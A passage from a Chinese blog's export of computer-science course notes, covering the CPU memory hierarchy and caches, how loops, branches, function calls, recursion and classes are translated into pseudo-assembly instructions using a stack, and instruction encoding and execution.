如果一个存储器的体积小，那它存储空间就会受到制约。 如果一个存储器电子元件密度很大，那散热就会有问题。因为电子元件都会产生热能，所以电子元件非常集中的 CPU，就需要单独的风扇或者水冷帮助电子元件降温。 如果一个存储器离 CPU 较远，那么在传输过程中必然会有延迟，因此传输速度也会下降。 这里你可能会有疑问，因为在大多数人的认知里，光速是很快的，而信号又是以光速传输的。既然光速这么快，那信号的延迟应该很小才对。但事实并不是这样，比如时钟信号是 1GHz 的 CPU，1G 代表 10 个亿，因此时钟信号的一个周期是 1/10 亿秒。而光的速度是 3×10 的 8 次方米每秒，就是 3 亿米每秒。所以在一个周期内，光只能前进 30 厘米。 你看！虽然在宏观世界里光速非常快，但是到计算机世界里，光速并没有像我们认知中的那么快。所以即使元件离 CPU 的距离稍微远了一点，运行速度也会下降得非常明显。 你可能还会问，那干吗不把内存放到 CPU 里？ 如果你这么做的话，除了整个电路散热和体积会出现问题，服务器也没有办法做定制内存了。也就是说 CPU 在出厂时就决定了它的内存大小，如果你想换更大的内存，就要换 CPU，而组装定制化是你非常重要的诉求，这肯定是不能接受的。 此外，在相同价格下，一个存储器的速度越快，那么它的能耗通常越高。能耗越高，发热量越大。 因此，我们上面提到的需求是不可能被全部满足的，除非将来哪天存储技术有颠覆性的突破。 存储器分级策略既然我们不能用一块存储器来解决所有的需求，那就必须把需求分级。 一种可行的方案，就是根据数据的使用频率使用不同的存储器：高频使用的数据，读写越快越好，因此用最贵的材料，放到离 CPU 最近的位置；使用频率越低的数据，我们放到离 CPU 越远的位置，用越便宜的材料。 具体来说，通常我们把存储器分成这么几个级别： 寄存器 L1-Cache L2-Cache L3-Cache 内存 硬盘/SSD 寄存器（Register）寄存器紧挨着 CPU 的控制单元和逻辑计算单元，它所使用的材料速度也是最快的。就像我们前面讲到的，存储器的速度越快、能耗越高、产热越大，而且花费也是最贵的，因此数量不能很多。 寄存器的数量通常在几十到几百之间，每个寄存器可以用来存储一定字节（byte）的数据。比如： 32 位 CPU 中大多数寄存器可以存储 4 个字节；64 位 CPU 中大多数寄存器可以存储 8 个字节。 寄存机的访问速度非常快，一般要求在半个 CPU 时钟周期内完成读写。比如一条要在 4 个周期内完成的指令，除了读写寄存器，还需要解码指令、控制指令执行和计算。如果寄存器的速度太慢，那 4 个周期就可能无法完成这条指令了。 L1-CacheL1- 缓存在 CPU 中，相比寄存器，虽然它的位置距离 CPU 核心更远，但造价更低。通常 L1-Cache 大小在几十 Kb 到几百 Kb 不等，读写速度在 2~4 个 CPU 时钟周期。 L2-CacheL2- 缓存也在 CPU 中，位置比 L1- 缓存距离 CPU 核心更远。它的大小比 L1-Cache 更大，具体大小要看 CPU 型号，有 2M 的，也有更小或者更大的，速度在 10~20 个 CPU 周期。 L3-CacheL3- 缓存同样在 CPU 中，位置比 L2- 缓存距离 CPU 核心更远。大小通常比 L2-Cache 更大，读写速度在 20~60 个 CPU 周期。L3 缓存大小也是看型号的，比如 i9 CPU 有 512KB L1 Cache；有 2MB L2 Cache； 有 16MB L3 Cache。 内存内存的主要材料是半导体硅，是插在主板上工作的。因为它的位置距离 CPU 有一段距离，所以需要用总线和 CPU 连接。因为内存有了独立的空间，所以体积更大，造价也比上面提到的存储器低得多。现在有的个人电脑上的内存是 16G，但有些服务器的内存可以到几个 T。内存速度大概在 200~300 个 CPU 周期之间。 SSD 和硬盘SSD 也叫固态硬盘，结构和内存类似，但是它的优点在于断电后数据还在。内存、寄存器、缓存断电后数据就消失了。内存的读写速度比 SSD 大概快 10~1000 倍。以前还有一种物理读写的磁盘，我们也叫作硬盘，它的速度比内存慢 100W 倍左右。因为它的速度太慢，现在已经逐渐被 SSD 替代。 当 CPU 需要内存中某个数据的时候，如果寄存器中有这个数据，我们可以直接使用；如果寄存器中没有这个数据，我们就要先查询 L1 缓存；L1 中没有，再查询 L2 缓存；L2 中没有再查询 L3 缓存；L3 中没有，再去内存中拿。 缓存条目结构上面我们介绍了存储器分级结构大概有哪些存储以及它们的特点，接下来还有一些缓存算法和数据结构的设计困难要和你讨论。比如 CPU 想访问一个内存地址，那么如何检查这个数据是否在 L1- 缓存中？换句话说，缓存中的数据结构和算法是怎样的？ 无论是缓存，还是内存，它们都是一个线性存储器，也就是数据一个挨着一个的存储。如果我们把内存想象成一个只有 1 列的表格，那么缓存就是一个多列的表格，这个表格中的每一行叫作一个缓存条目。 方案 1缓存本质上是一个 Key-Value 的存储，它的 Key 是内存地址，值是缓存时刻内存地址中的值。我们先思考一种简单的方案，一个缓存条目设计 2 列： 内存的地址 内存的值 CPU 读取到一个内存地址，我们就增加一个条目。当我们要查询一个内存地址的数据在不在 L1- 缓存中的时候，可以遍历每个条目，看条目中的内存地址是否和查询的内存地址相同。如果相同，我们就取出条目中缓存的值。 这个方法需要遍历缓存中的每个条目，因此计算速度会非常慢，在最坏情况下，算法需要检查所有的条目，所以这不是一个可行的方案。 方案 2其实很多优秀的方案，往往是从最笨的方案改造而来的。现在我们已经拥有了一个方案，但是这个方案无法快速确定一个内存地址缓存在哪一行。因此我们想要找到一个更好的方法，让我们看到一个内存地址，就能够快速知道它在哪一行。 这里，我们可以用一个数学的方法。比如有 1000 个内存地址，但只有 10 个缓存条目。内存地址的编号是 0、1、2、3，…，999，缓存条目的编号是 0~9。我们思考一个内存编号，比如 701，然后用数学方法把它映射到一个缓存条目，比如 701 整除 10，得到缓存条目 1。 用这种方法，我们每次拿到一个内存地址，都可以快速确定它的缓存条目；然后再比较缓存条目中的第一列内存地址和查询的内存地址是否相同，就可以确定内存地址有没有被缓存。 延伸一下，这里用到了一种类似哈希表的方法：地址 % 10，其实就构成了一个简单的哈希函数。 指令的预读接下来我们讨论下指令预读的问题。 之前我们学过，CPU 顺序执行内存中的指令，CPU 执行指令的速度是非常快的，一般是 26 个 CPU 时钟周期；这节课，我们学习了存储器分级策略，发现内存的读写速度其实是非常慢的，大概有 200300 个时钟周期。 不知道你发现没有？这也产生了一个非常麻烦的问题：CPU 其实是不能从内存中一条条读取指令再执行的，如果是这样做，那每执行一条指令就需要 200~300 个时钟周期了。 那么，这个问题如何处理呢？ 这里我再多说一句，你在做业务开发 RPC 调用的时候，其实也会经常碰到这种情况，远程调用拖慢了整体执行效率，下面我们一起讨论这类问题的解决方案。 一个解决办法就是 CPU 把内存中的指令预读几十条或者上百条到读写速度较快的 L1- 缓存中，因为 L1- 缓存的读写速度只有 2~4 个时钟周期，是可以跟上 CPU 的执行速度的。 这里又产生了另一个问题：如果数据和指令都存储在 L1- 缓存中，如果数据缓存覆盖了指令缓存，就会产生非常严重的后果。因此，L1- 缓存通常会分成两个区域，一个是指令区，一个是数据区。 与此同时，又出现了一个问题，L1- 缓存分成了指令区和数据区，那么 L2/L3 需不需要这样分呢？其实，是不需要的。因为 L2 和 L3，不需要协助处理指令预读的问题。 缓存的命中率接下来，还有一个重要的问题需要解决。就是 L1/L2/L3 加起来，缓存的命中率有多少？ 所谓命中就是指在缓存中找到需要的数据。和命中相反的是穿透，也叫 miss，就是一次读取操作没有从缓存中找到对应的数据。 据统计，L1 缓存的命中率在 80% 左右，L1/L2/L3 加起来的命中率在 95% 左右。因此，CPU 缓存的设计还是相当合理的。只有 5% 的内存读取会穿透到内存，95% 都能读取到缓存。 这也是为什么程序语言逐渐取消了让程序员操作寄存器的语法，因为缓存保证了很高的命中率，多余的优化意义不大，而且很容易出错。 缓存置换问题最后的一个问题，比如现在 L1- 缓存条目已经存满了，接下来 CPU 又读了内存，需要把一个新的条目存到 L1- 缓存中，既然有一个新的条目要进来，那就有一个旧的条目要出去。所以，这个时候我们就需要用一个算法去计算哪个条目应该被置换出去。这个问题叫作缓存置换问题。 总结所有缓存系统的设计，都是存储资源的分级。我们在设计缓存的时候，除了要关心整体架构外，还需要注意细节，比如： 条目怎么设计？ 算法怎么设计？ 命中率怎么统计？ 缓存怎么置换等？ SSD、内存和 L1 Cache 相比速度差多少倍？ 因为内存比 SSD 快 101000 倍，L1 Cache 比内存快 100 倍左右。因此 L1 Cache 比 SSD 快了 1000100000 倍。所以你有没有发现 SSD 的潜力很大，好的 SSD 已经接近内存了，只不过造价还略高。 这个问题告诉我们，不同的存储器之间性能差距很大，构造存储器分级很有意义，分级的目的是要构造缓存体系。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"递归程序","slug":"计操/递归程序","date":"2021-07-15T13:18:45.000Z","updated":"2021-07-15T06:52:25.801Z","comments":true,"path":"2021/07/15/计操/递归程序/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E9%80%92%E5%BD%92%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"问题：不支持递归的程序语言，如何实现递归程序？ 首先，它不是纯粹考概念和死记硬背，求职者在回答问题之前需要进行一定的思考 其次，这道题目可以继续深挖，比如可以让求职者具体写一个程序，就变成了一道编程题 最后，这道题目有实战意义，它背后考察的是求职者的编程功底 为了弄清楚这道题目，你需要对程序有一个更深层次的认识，不仅仅停留在指令的执行层面，而是要灵活使用指令，去实现更加复杂的功能。 for 循环如何被执行首先，我们来看 for 循环是如何实现的。下面是一个求 1 加到 100 的 Java 程序，请你思考如何将它转换为指令： 1234var i = 1, s = 0;for(;i &lt;= 100; i++) &#123; s+=i;&#125; 指令是简单的，像积木一样，程序是复杂的，像房子一样。我们将简单的事情组合，然后去完成复杂的事情，这就是程序员每天在做的。在这个过程中，你会产生思考，比如如何排列组合，如何搭积木，才能更快更准地完成项目？所以这也是训练思维的一个过程。 经过思考，如果按照顺序执行上面的程序，则需要很多指令，因为 for 循环可以执行 1 次，也可以执行 100W 次，还可以执行无数次。因此，指令的设计者提供了一种 jump 类型的指令，让你可以在程序间跳跃，比如: 12loop: jump loop 这就实现了一个无限循环，程序执行到 jumploop 的时候，就会跳回 loop 标签。用这种方法，我们可以将 for 循环用底层的指令实现： 1234567891011121314151617181920212223242526272829303132333435363738394041# var i = 1, s = 0# 对应 Java 代码，我们首先将 1 和 0 存储到两个地址# 这两个地址我们用 $i 和 $s 表示store #1 -&gt; $i // 将数字 1 存入i的地址store #0 -&gt; $s // 将数字 0 存入 s 的地址# 接下来循环要开始了，我们在这里预留一个 loop 标签# loop 是一个自定义标签，它代表指令的相对位置# 后续我们可以用 jump 指令跳转回这个位置实现循环loop: # 循环标签# for ... i &lt;= 100# 接下来我们开始实现循环控制# 我们先首先 i &lt;= 100的比较# 我们先将变量 i 的地址，也就是 $i 导入寄存器 R0load $i -&gt; R0# 然后我们用 cmp 比较指令 R0 和数字 100cmp R0 #100 // 比较 R0 和数字 100# 注意指令不会有返回值，它会进行计算，然后改变机器的状态（也就是寄存器）# 比较后，有几个特殊的寄存器会保存比较结果# 然后我们用 ja（jump above）, 如果比较结果 R0 比 100 大# 那么我们就跳转到 end 标签，实现循环的跳出ja endnop# 如果 R0&lt;=100，那么ja end 没有生效，这时我们处理 s+=i# 首先我们把变量 s 所在地址的数据导入寄存器 R1load $s -&gt; R1# 然后我们把寄存器R0和R1加和，把结果存储寄存器 R2add R0 R1 R2# 这时，我们把寄存器 R2 的值存入变量 s 所在的地址store R2 -&gt; $s# 刚才我们完成了一次循环# 我们还需要维护变量 i 的自增# 现在 i 的值在 R0 中，我们首先将整数 1 叠加到 R0 上add R0 #1 R0# 再把 R0 的值存入i所在的内存地址store R0 -&gt; $i# 这时我们的循环体已经全部执行完成，我们需要调转回上面 loop 标签所在的位置# 继续循环jump loopnopend: 通过上面的方法，我们成功将 for 循环的程序转换成了指令，然后再将它们编码成二进制，就可以存储到内存中了。 jump 指令直接操作 PC 指针，但是很多 CPU 会抢先执行下一条指令，因此通常我们在 jump 后面要跟随一条 nop 指令，让 CPU 空转一个周期，避免 jump 下面的指令被执行。是不是到了微观世界，和你所认识的程序还不太一样？ 面我写指令的时候用到了 add/store 这些指令，它们叫作助记符，是帮助你记忆的。整体这段程序，我们就称作汇编程序。 因为不同的机器助记符也不一样，所以你不用太关注我用的是什么汇编语言，也不用去记忆这些指令。当你拿到指定芯片的时候，直接去查阅芯片的说明书就可以了。 虽然不同 CPU 的指令不一样，但也是有行业标准的。现在使用比较多的是 RISC（精简指令集）和 CISC（复杂指令集）。比如目前 Intel 和 AMD 家族主要使用 CISC 指令集，ARM 和 MIPS 等主要使用 RISC 指令集。 条件控制程序条件控制程序有两种典型代表，一种是 if-else ，另一种是 switch-case 。 总体来说， if-else 翻译成指令，是比较简单的，你需要用跳转指令和比较指令处理它的跳转逻辑。 当然，它们的使用场景不同，这块我不展开了。在这里我主要想跟你说说，它们的内部实现是不一样的。if-else 是一个自上向下的执行逻辑， switch-case 是一种精确匹配算法。比如你有 1000 个 case，如果用 if-else 你需要一个个比较，最坏情况下需要比较 999 次；而如果用 switch-case ，就不需要一个个比较，通过算法就可以直接定位到对应的 case 。 举个具体的例子，比如一个根据数字返回星期的程序。如果用 if-else，那么你需要这样做： 123456if(week == 1) &#123; return &quot;周一&quot;;&#125; else if(week == 2) &#123; return &quot;周二&quot;;&#125;…… 如果用 switch-case 的逻辑，你可能会这样计算： 1跳转位置=当前PC + 4*(week * 2 - 1) switch-case 实现更多是依赖数学关系，直接算出 case 所在指令的位置，而不是一行行执行和比较。 函数了解了循环和条件判断，我们再来看看函数是如何被执行的。函数的执行过程必须深入到底层，也会涉及一种叫作栈的数据结构。 下面是一段 C 程序，传入两个参数，然后返回两个参数的和： 123int add(int a, int b)&#123; return a + b;&#125; 通过观察，我们发现函数的参数 a,b 本质是内存中的数据，因此需要给它们分配内存地址。函数返回值也是内存中的数据，也就是返回值也需要分配内存地址。调用函数其实就是跳转到函数体对应的指令所在的位置，因此函数名可以用一个标签，调用时，就用 jump 指令跟这个标签。 比如上面函数进行了 a+b 的运算，我们可以这样构造指令： 12345678# 首先我们定义一个叫作add的标签add:# 然后我们将a和b所在地址中的数据都导入寄存器load $a -&gt; R0load $b -&gt; R1# 然后我们将寄存器求和，并将结果回写到返回地址add R0 R1 R2store R2 -&gt; $r 当我们需要调用这个函数的时候，我们就构造下面这样的指令： 1jump add 细心的同学可能已经发现，这里有 2 个问题还没有解决： 参数如何传递给函数？ 返回值如何传递给调用者？ 为了解决这 2 个问题，我们就需要用到前面提到的一个叫作栈的数据结构。栈的英文是 Stack，意思是码放整齐的一堆东西。首先在调用方，我们将参数传递给栈；然后在函数执行过程中，我们从栈中取出参数。 flowchart LR A[调用] --压栈参数--&gt; B[Stack] B --取出参数--&gt; C[函数执行] 函数执行过程中，先将执行结果写入栈中，然后在返回前把之前压入的参数出栈，调用方再从栈中取出执行结果。 flowchart RL B[Stack] --取出结果--&gt; A[调用] C[函数执行] --写入结果参数出栈--&gt; B 将参数传递给 Stack 的过程，叫作压栈。取出结果的过程，叫作出栈。栈就好像你书桌上的一摞书，压栈就是把参数放到书上面，出栈就是把顶部的书拿下来。 因为栈中的每个数据大小都一样，所以在函数执行的过程中，我们可以通过参数的个数和参数的序号去计算参数在栈中的位置。 接下来我们来看看函数执行的整体过程：假设要计算 11 和 15 的和，我们首先在内存中开辟一块单独的空间，也就是栈。 就如前面所讲，栈的使用方法是不断往上堆数据，所以需要一个栈指针（Stack Pointer， SP）指向栈顶（也就是下一个可以写入的位置）。每次将数据写入栈时，就把数据写到栈指针指向的位置，然后将 SP 的值增加。 为了提高效率，我们通常会用一个特殊的寄存器来存储栈指针，这个寄存器就叫作 Stack Pointer，在大多数芯片中都有这个特殊的寄存器。一开始，SP 指向 0x100 位置，而 0x100 位置还没有数据。 压栈参数 11 接下来我们开始传参，我们先将 11 压栈，之所以称作压栈（Push），就好像我们把数据 11 堆在内存中一样。模拟压栈的过程是下面两条指令： 12store #11 -&gt; $SP // 将11存入SP指向的地址0x100add SP, 4, SP // 栈指针增加4（32位机器） 第一条 store 指令将 SP 寄存器指向的内存地址设置为常数 11。 第二条指令将栈指针自增 4。 这里用美元符号代表将 11 存入的是 SP 寄存器指向的内存地址，这是一次间接寻址。存入后，栈指针不是自增 1 而是自增了 4，因为我在这里给你讲解时，用的是一个 32 位宽的 CPU 。如果是 64 位宽的 CPU，那么栈指针就需要自增 8。 压栈完成后，内存变成下图中所示的样子。11 被写入内存，并且栈指针指向了 0x104 位置。 压栈参数 15 然后我们用同样的方法将参数 15 压栈。 压栈后，11 和 15 都被放入了对应的内存位置，并且栈指针指向了 0x108。 将返回值压栈 接下来，我们将返回值压栈。到这里你可能会问，返回值还没有计算呢，怎么就压栈了？其实这相当于一个占位，后面我们会改写这个地址。 调用函数 当我们完成了上面的压栈后，就开始调用函数，一种简单的做法是用 jump 指令直接跳转到函数的标签，比如： 1jump add 这个时候，要加和在栈中的数据 11 和 15，我们可以利用 SP 指针寻找数据。11 距离当前 SP 指针差 3 个位置，15 距离 SP 指针差 2 个位置。这种寻址方式是一种复合的寻址方式，是间接 + 偏移量寻址。 我们可以用下面的代码完成将 11 和 15 导入寄存器的过程： 12load $(SP - 12) -&gt; R0load $(SP - 8) -&gt; R1 然后进行加和，将结果存入 R2。 1load R0 R1 R2 最后我们可以再次利用数学关系将结果写入返回值所在的位置。 1store R2 -&gt; $(SP-4) 上面我们用到了一种间接寻址的方式来进行加和运算，也就是利用 SP 中的地址做加减法操作内存。经过函数调用的结果如下图所示，运算结果 26 已经被写入了返回值的位置： 发现-解决问题一个好的解决方案，也会面临问题。现在我们就遇到了麻烦： 函数计算完成，这时应该跳转回去。可是我们没有记录函数调用前 PC 指针的位置，因此这里需要改进，我们需要存储函数调用前的 PC 指针方便调用后恢复。 栈不可以被无限使用，11 和 15 作为参数，计算出了结果 26，那么它们就可以清空了。如果用调整栈指针的方式去清空，我们就会先清空 26。此时就会出现顺序问题，因此我们需要调整压栈的顺序。 具体顺序你可以看下图。首先，我们将函数参数和返回值换位，这样在清空数据的时候，就会先清空参数，再清空返回值。 然后我们在调用函数前，还需要将返回地址压栈。这样在函数计算完成前，就能跳转回对应的返回地址。翻译成指令，就是下面这样： 1234567891011121314151617## 压栈返回值add SP, 4 -&gt; SP# 计算返回地址# 我们需要跳转到清理堆栈那行，也就是16行MOV PC+4*(参数个数*2+1) -&gt; SP# 压栈参数的程序……# 执行函数，计算返回值call function# 清理堆栈add SP, -(参数个数+1)*4， SP 递归函数如何被执行我们刚刚使用了栈解决了函数的调用问题。但是这个方案究竟合不合理，还需要用更复杂的情况来验证。 如下所示，我们给出一个递归函数，请你判断是否可以用上面的方法执行： 1234int sum(int n)&#123; if(n == 1) &#123;return 1;&#125; return n + sum(n-1);&#125; 递归的时候，我们每次执行函数都形成一个如下所示的栈结构： 比如执行 sum(100)，我们就会形成一个复杂的栈，第一次调用 n = 100，第二次递归调用 n = 99： 它们堆在了一起，就形成了一个很大的栈，简化一下就是这样的一个模型，如下所示： 到这里，递归消耗了更多空间，但是也保证了中间计算的独立性。当递归执行到 100 次的时候，就会执行下面的语句： 1if(n == 1) &#123;return 1;&#125; 于是触发第 99 次递归执行： 1return 2 + sum(1) // sum(1) = 1 上面程序等价于 return 3，接着再触发第 98 次递归的执行，然后是第 97 次，最终触发到第一次函数调用返回结果。 由此可见，栈这种结构同样适合递归的计算。事实上，计算机编程语言就是用这种结构来实现递归函数。 类型（class）如何实现按照我们之前已经学习到的知识： 变量是一个内存地址，所以只需要分配内存就好了； 循环控制可以用跳转加判断实现； 条件控制也可以用跳转加判断实现，只不过如果是 switch-case 还需要一定的数学计算； 函数调用需要压栈参数、返回值和返回地址。 最后，我们来说说类型是如何实现的，也就是很多语言都支持的 class 如何被翻译成指令。其实 class 实现非常简单，首先一个 class 会分成两个部分，一部分是数据（也称作属性），另一部分是函数（也称作方法）。 class 有一个特殊的方法叫作构造函数，它会为 class 分配内存。构造函数执行的时候，开始扫描类型定义中所有的属性和方法。 如果遇到属性，就为属性分配内存地址； 如果遇到方法，方法本身需要存到正文段（也就是程序所在的内存区域），再将方法的值设置为方法指令所在的内存地址。 当我们调用一个 class 方法的时候，本质上是执行了一个函数，因此和函数调用是一致的： 首先把返回值和返回地址压栈； 然后压栈参数； 最后执行跳转。 这里有一个小问题，有时候 class 的方法会用到 this ，这其实并不复杂，你仔细想想， this 指针不就是构造函数创建的一个指向 class 实例的地址吗？那么，有一种简单的实现，就是我们可以把 this 作为函数的第一个参数压栈。这样，类型的函数就可以访问类型的成员了，而类型也就可以翻译成指令了。 总结 我们写的程序需要翻译成指令才能被执行，，这个翻译工具叫作编译器。 平时你编程做的事情，用机器指令也能做，所以从计算能力上来说它们是等价的，最终这种计算能力又和图灵机是等价的。如果一个语言的能力和图灵机等价，我们就说这个语言是图灵完备的语言。现在市面上的绝大多数语言都是图灵完备的语言，但也有一些不是，比如 HTML、正则表达式和 SQL 等。 我们通过汇编语言构造高级程序；通过高级程序构造自己的业务逻辑，这些都是工程能力的一种体现。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"程序的执行（下）","slug":"计操/程序的执行下","date":"2021-07-14T17:51:42.000Z","updated":"2021-07-15T07:26:54.620Z","comments":true,"path":"2021/07/15/计操/程序的执行下/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%8B/","excerpt":"","text":"程序的执行过程当 CPU 执行程序的时候： 首先，CPU 读取 PC 指针指向的指令，将它导入指令寄存器。具体来说，完成读取指令这件事情有 3 个步骤： CPU 的控制单元操作地址总线指定需要访问的内存地址（简单理解，就是把 PC 指针中的值拷贝到地址总线中）。 CPU 通知内存设备准备数据（内存设备准备好了，就通过数据总线将数据传送给 CPU）。 CPU 收到内存传来的数据后，将这个数据存入指令寄存器。 完成以上 3 步，CPU 成功读取了 PC 指针指向指令，存入了指令寄存器。 然后，CPU 分析指令寄存器中的指令，确定指令的类型和参数。 如果是计算类型的指令，那么就交给逻辑运算单元计算；如果是存储类型的指令，那么由控制单元执行。 PC 指针自增，并准备获取下一条指令。 比如在 32 位的机器上，指令是 32 位 4 个字节，需要 4 个内存地址存储，因此 PC 指针会自增 4。 详解 a = 11 + 15 的执行过程上面我们了解了基本的程序执行过程，接下来我们来看看如果用冯诺依曼模型执行 a=11+15 是一个怎样的过程。 我们再 Review 下这个问题：程序员写的程序 a=11+15 是字符串，CPU 不能执行字符串，只能执行指令。所以这里需要用到一种特殊的程序——编译器。编译器的核心能力是翻译，它把一种程序翻译成另一种程序语言。 这里，我们需要编译器将程序员写的程序翻译成 CPU 认识的指令（指令我们认为是一种低级语言，我们平时书写的是高级语言）。你可以先跟我完整地学完操作系统，再去深入了解编译原理的内容。 下面我们来详细阐述 a=11+15 的执行过程： 编译器通过分析，发现 11 和 15 是数据，因此编译好的程序启动时，会在内存中开辟出一个专门的区域存这样的常数，这个专门用来存储常数的区域，就是数据段，如下图所示： 11 被存储到了地址 0x100 15 被存储到了地址 0x104 编译器将 a=11+15 转换成了 4 条指令，程序启动后，这些指令被导入了一个专门用来存储指令的区域，也就是正文段。如上图所示，这 4 条指令被存储到了 0x200-0x20c 的区域中： 0x200 位置的 load 指令将地址 0x100 中的数据 11 导入寄存器 R0 0x204 位置的 load 指令将地址 0x104 中的数据 15 导入寄存器 R1 0x208 位置的 add 指令将寄存器 R0 和 R1 中的值相加，存入寄存器 R2 0x20c 位置的 store 指令将寄存器 R2 中的值存回数据区域中的 0x1108 位置 具体执行的时候，PC 指针先指向 0x200 位置，然后依次执行这 4 条指令。 这里还有几个问题要说明一下： 变量 a 实际上是内存中的一个地址，a 是给程序员的助记符。 为什么 0x200 中代表加载数据到寄存器的指令是 0x8c000100，我们会在下面详细讨论。 不知道细心的同学是否发现，在上面的例子中，我们每次操作 4 个地址，也就是 32 位，这是因为我们在用 32 位宽的 CPU 举例。在 32 位宽的 CPU 中，指令也是 32 位的。但是数据可以小于 32 位，比如可以加和两个 8 位的字节。 关于数据段和正文段的内容，会在模块四进程和线程部分继续讲解。 指令在上面的例子中，load 指令将内存中的数据导入寄存器，我们写成了 16 进制：0x8c000100，拆分成二进制就是： 这里大家还是看下图，需要看一下才能明白。 最左边的 6 位，叫作操作码，英文是 OpCode，100011 代表 load 指令 中间的 4 位 0000 是寄存器的编号，这里代表寄存器 R0 后面的 22 位代表要读取的地址，也就是 0x100 所以我们是把操作码、寄存器的编号、要读取的地址合并到了一个 32 位的指令中。 我们再来看一条求加法运算的 add 指令，16 进制表示是 0x08048000，换算成二进制就是： 最左边的 6 位是指令编码，代表指令 add 紧接着的 4 位 0000 代表寄存器 R0 然后再接着的 4 位 0001 代表寄存器 R1 再接着的 4 位 0010 代表寄存器 R2 最后剩下的 14 位没有被使用 构造指令的过程，叫作指令的编码，通常由编译器完成；解析指令的过程，叫作指令的解码，由 CPU 完成。由此可见 CPU 内部有一个循环： 首先 CPU 通过 PC 指针读取对应内存地址的指令，我们将这个步骤叫作 Fetch，就是获取的意思。 CPU 对指令进行解码，我们将这个部分叫作 Decode。 CPU 执行指令，我们将这个部分叫作 Execution。 CPU 将结果存回寄存器或者将寄存器存入内存，我们将这个步骤叫作 Store。 上面 4 个步骤，我们叫作 CPU 的指令周期。CPU 的工作就是一个周期接着一个周期，周而复始。 指令的类型通过上面的例子，你会发现不同类型（不同 OpCode）的指令、参数个数、每个参数的位宽，都不一样。而参数可以是以下这三种类型： 寄存器 内存地址； 数值（一般是整数和浮点） 当然，无论是寄存器、内存地址还是数值，它们都是数字。指令从功能角度来划分，大概有以下 5 类： I/O 类型的指令，比如处理和内存间数据交换的指令 store/load 等；再比如将一个内存地址的数据转移到另一个内存地址的 mov 指令。 计算类型的指令，最多只能处理两个寄存器，比如加减乘除、位运算、比较大小等。 跳转类型的指令，用处就是修改 PC 指针。比如编程中大家经常会遇到需要条件判断+跳转的逻辑，比如 if-else，swtich-case、函数调用等。 信号类型的指令，比如发送中断的指令 trap。 闲置 CPU 的指令 nop，一般 CPU 都有这样一条指令，执行后 CPU 会空转一个周期。 指令还有一个分法，就是寻址模式，比如同样是求和指令，可能会有 2 个版本： 将两个寄存器的值相加的 add 指令。 将一个寄存器和一个整数相加的 addi 指令。 另外，同样是加载内存中的数据到寄存器的 load 指令也有不同的寻址模式： 比如直接加载一个内存地址中的数据到寄存器的指令 la，叫作直接寻址。 直接将一个数值导入寄存器的指令 li，叫作寄存器寻址。 将一个寄存器中的数值作为地址，然后再去加载这个地址中数据的指令 lw，叫作间接寻址。 因此寻址模式是从指令如何获取数据的角度，对指令的一种分类，目的是给编写指令的人更多选择。 关于寻址模式和所有的指令，只要你不是嵌入式开发人员，就不需要记忆，理解即可。 不同 CPU 的指令和寄存器名称都不一样，因此这些名称也不需要你记忆。 有几个寄存器在所有 CPU 里名字都一样，比如 PC 指针、指令寄存器等。 指令的执行速度之前我们提到过 CPU 是用石英晶体产生的脉冲转化为时钟信号驱动的，每一次时钟信号高低电平的转换就是一个周期，我们称为时钟周期。CPU 的主频，说的就是时钟信号的频率。比如一个 1GHz 的 CPU，说的是时钟信号的频率是 1G。 到这里你可能会有疑问：是不是每个时钟周期都可以执行一条指令？其实，不是的，多数指令不能在一个时钟周期完成，通常需要 2 个、4 个、6 个时钟周期。 总结如果说的是 64 位宽 CPU，那么有 2 个优势。 64 位 CPU 可以执行更大数字的运算，这个优势在普通应用上不明显，但是对于数值计算较多的应用就非常明显。 64 位 CPU 可以寻址更大的内存空间 如果 32 位/64 位说的是程序，那么说的是指令是 64 位还是 32 位的。32 位指令在 64 位机器上执行，困难不大，可以兼容。 如果是 64 位指令，在 32 位机器上执行就困难了。因为 32 位指令在 64 位机器执行的时候，需要的是一套兼容机制；但是 64 位指令在 32 位机器上执行，32 位的寄存器都存不下指令的参数。 操作系统也是一种程序，如果是 64 位操作系统，也就是操作系统中程序的指令都是 64 位指令，因此不能安装在 32 位机器上。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"程序的执行（上）","slug":"计操/程序的执行上","date":"2021-07-14T17:20:35.000Z","updated":"2021-07-14T09:51:54.497Z","comments":true,"path":"2021/07/15/计操/程序的执行上/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%8A/","excerpt":"","text":"面试题：相比 32 位，64 位的优势是什么？ 如果是软件，那么我们的数据库有 32 位和 64 位版本 如果是操作系统，那么选择 centos 和 debian 版本的时候，也会有 32/64 版本 如果是 CPU 那么有 32 位 CPU，也有 64 位 CPU 图灵机的构造 第一，它清楚的定义了计算机能力的边界，也就是可计算理论 第二，它清楚的定义了计算机由哪些部分组成，程序又是如何执行的 图灵机的内部构造 图灵机拥有一条无限长的纸袋，纸袋上是一个格子挨着一个格子，格子中可以写字符，字符可以看作是数据或者程序 图灵机有一个读写头，读写头可以读取任意格子上的字符，也可以改写任意格子的字符 读写头上面的盒子里是一些精密的零件，包括图灵机的存储、控制单元和运算单元 比如我们需要计算 11 加 15 的值 首先，我们将“11、15、+” 分别写入纸带上的 3 个格子（现在纸带上的字符串是11、15、 +)，然后将读写头先停在 11 对应的格子上。 接下来，图灵机通过读写头读入 11 到它的存储设备中（这个存储设备也叫作图灵机的状态）。图灵机没有说读写头为什么可以识别纸带上的字符，而是假定读写头可以做到这点。 然后读写头向右移动一个格，用同样的方法将 15 读入图灵机的状态中。现在图灵机的状态中有两个连续的数字，11 和 15。 接下来重复上面的过程，会读到一个+号。下面我详细说一下这个运算流程： 读写头读到一个 + 号 然后将 + 号传输给控制单元 控制单元发现是一个 + 号，所以没有存入状态中。因为 + 